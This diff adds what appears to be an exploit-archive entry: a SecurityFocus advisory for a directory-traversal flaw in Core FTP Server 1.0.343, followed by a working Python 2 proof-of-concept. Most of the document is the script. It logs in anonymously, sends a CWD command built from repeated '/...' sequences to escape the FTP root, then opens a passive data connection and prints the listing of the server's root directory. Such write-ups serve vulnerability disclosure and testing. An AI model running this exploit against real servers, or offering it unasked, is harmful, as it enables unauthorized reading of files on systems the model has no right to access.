@@ -1,0 +1,74 @@
+source: http://www.securityfocus.com/bid/40422/info
+
+Core FTP Server is prone to a directory-traversal vulnerability because the application fails to sufficiently sanitize user-supplied input.
+
+Exploiting this issue will allow an attacker to view arbitrary local files within the context of the webserver. Information harvested may aid in launching further attacks.
+
+Core FTP Server 1.0.343 is vulnerable; other versions may also be affected. 
+
+import sys, socket, re
+
+host = 'localhost'
+port = 21
+user = 'anonymous'
+password = 'a'
+
+buffer_size = 8192
+timeout = 8
+
+def recv(s):
+    resp = ''
+
+    while 1:
+        r = s.recv(buffer_size)
+        if not r: break
+        resp += r
+
+    return resp
+
+def list_root():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, port))
+        s.settimeout(timeout)
+
+        print s.recv(buffer_size)            
+
+        s.send('USER ' + user + '\r\n')                   
+        print s.recv(buffer_size)            
+
+        s.send('PASS ' + password + '\r\n')               
+        print s.recv(buffer_size) + s.recv(buffer_size)
+
+        s.send('CWD ' + '/...' * 16 + '\r\n')
+
+        resp = s.recv(buffer_size)
+
+        print resp
+        
+        if resp[:3] == '250':
+            s.send('PASV\r\n')                                   
+            resp =  s.recv(buffer_size)
+
+            print resp
+            
+            pasv_info = re.search(u'(\d+),(\d+),(\d+),(\d+),(\d+),(\d+)', resp)
+
+            if (pasv_info == None):
+                print 'Invalid PASV response: ' + resp
+                return            
+
+            s.send('LIST\r\n')            
+
+            s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s2.connect((host, int(pasv_info.group(5)) * 256 + int(pasv_info.group(6))))
+            s2.settimeout(timeout)           
+
+            print recv(s2)
+
+        s.close()
+
+    except Exception:        
+        print sys.exc_info()
+
+list_root()
